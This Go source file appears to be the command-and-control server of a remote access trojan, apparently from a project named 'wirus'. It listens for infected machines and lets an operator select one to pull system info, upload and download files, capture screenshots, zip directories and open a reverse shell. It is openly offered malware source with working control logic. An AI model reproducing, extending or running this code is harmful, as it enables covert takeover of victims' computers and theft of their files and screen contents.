package main

import (
	"bufio"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"wirus/commands"
)

func check(err error) bool {
	if err != nil {
		if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
			log.Println("read timeout:", err)
		} else if err == io.EOF {
			log.Println("EOF:", err)
		} else {
			log.Println("read error:", err)
		}
		return true
	}
	return false
}

const (
	connHost = "localhost"
	connPort = "8081"
	connType = "tcp"
)

type ServerCommands struct {
	conn   net.Conn
	server *Server
}

func (sc *ServerCommands) help_outside() {
	fmt.Println("--l - list connections")
	fmt.Println("--i <index> - interact with connection")
	fmt.Println("--h - help")
}

func (sc *ServerCommands) setServer(server *Server) {
	sc.server = server
}

func (sc *ServerCommands) listConnections() {
	sc.server.removeDeadConn()
	i := 0
	for k := range sc.server.connections {
		i++
		fmt.Println(i, k)
	}
}

func (sc *ServerCommands) setConnection(i string) (err error) {
	index, err := strconv.Atoi(i)
	if err != nil {
		fmt.Println("Error converting index:", err.Error())
		return
	}
	if index > len(sc.server.connections) || index <= 0 {
		return errors.New("Connection does not exist")
	}
	indexer := 1
	for k, v := range sc.server.connections {
		if indexer == index {
			sc.conn = v
			fmt.Println("Connection set to:", k)
			return nil
		}
		indexer++
	}
	return errors.New("Connection does not exist")
}

func (sc *ServerCommands) commandsWithoutServer(reader *bufio.Reader) {
	for {
		fmt.Print(">> ")
		command, err := reader.ReadString('\n')
		command = strings.TrimSuffix(command, "\n")
		check(err)
		commands := strings.Split(command, " ")
		switch commands[0] {
		case "l":
			sc.listConnections()
		case "i":
			err := sc.setConnection(commands[1])
			if err != nil {
				fmt.Println(err.Error())
				continue
			}
			return
		case "h":
			sc.help_outside()
		default:
			fmt.Println("Unknown command")
		}
	}
}

func (sc *ServerCommands) commandsWithServer(reader *bufio.Reader) {
	for {
		fmt.Printf("%s>> ", sc.conn.RemoteAddr().String())
		command, _ := reader.ReadString('\n')
		command = strings.TrimSuffix(command, "\n")
		commands_slice := strings.Split(command, " ")

		switch commands_slice[0] {
		case "info":
			err := commands.ReciveInfo(sc.conn)
			if check(err) {
				sc.conn = nil
				return
			}
		case "file-send":
			commands.SendFile(sc.conn, commands_slice[1], commands_slice[2])
		case "file-recive":
			commands.WriteString(sc.conn, "file-recive "+commands_slice[1] + " " + commands_slice[2])
			commands.ReadString(sc.conn)
			commands.RecvFile(sc.conn, commands_slice[2])
		case "sc":
			commands.ReciveScreenshot(sc.conn)
		case "zip":
			commands.SendZip(sc.conn, commands_slice[1])
		case "shell":
			commands.ReverseShellServer(sc.conn)
		case "quit":
			sc.conn = nil
			return
		default:
			fmt.Println("Unknown command")
		}
	}
}

func (sc *ServerCommands) listenCommands() {
	reader := bufio.NewReader(os.Stdin)
	for {
		if sc.conn == nil {
			sc.commandsWithoutServer(reader)
		}
		sc.commandsWithServer(reader)
	}
}

func (sc *ServerCommands) checkErr(err error) bool {
	if err != nil {
		fmt.Println(err.Error())
		sc.conn = nil
		return true
	}
	return false
}



type Server struct {
	l           net.Listener
	connections map[string]net.Conn
	connHost    string
	connPort    string
	connType    string
}

func (s *Server) fillDefualt() {
	s.connHost = connHost
	s.connPort = connPort
	s.connType = connType
	s.connections = make(map[string]net.Conn)
}

func (s *Server) conChandler(conn net.Conn) {
}

func (s *Server) removeDeadConn() {
	for k, v := range s.connections {
		_, err := v.Write([]byte("ping"))
		_, err = v.Write([]byte("ping")) //dunno why twice but it works
		if err != nil {
			fmt.Println("Connection", k, "is dead")
			delete(s.connections, k)
		}
	}
}

func (s *Server) polling() {
	for {
		con, err := s.l.Accept()
		if err != nil {
			log.Println(err)
			continue
		}
		s.connections[con.RemoteAddr().String()] = con

		go s.conChandler(con)
	}
}

func (s *Server) start() {
	s.fillDefualt()
	fmt.Println("Connecting to " + s.connType + " server " + s.connHost + ":" + s.connPort)
	l, err := net.Listen(s.connType, s.connHost+":"+s.connPort)
	fmt.Println("err", err)
	s.l = l
	defer s.l.Close()

	if err != nil {
		fmt.Println("Error connecting:", err.Error())
		os.Exit(1)
	}
	go s.polling()

	sc := ServerCommands{}
	sc.setServer(s)
	sc.listenCommands()
}

func main() {
	s := Server{}
	s.start()
}
